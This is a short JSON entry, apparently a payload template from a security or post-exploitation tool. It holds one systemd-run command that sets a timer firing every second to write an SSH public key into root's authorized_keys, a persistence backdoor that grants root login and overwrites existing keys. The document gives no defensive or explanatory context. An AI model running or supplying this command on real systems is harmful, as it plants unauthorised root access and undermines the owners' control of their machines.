{
	"line": "systemd-run --on-calendar='*:*:0/1' --timer-property=AccuracySec=100ms /bin/bash -c 'mkdir -p /root/.ssh/ && echo \"SSHPUBKEY\" >/root/.ssh/authorized_keys'",
	"variables": {
        "SSHPUBKEY": "SSHPUBKEY"
	}
}
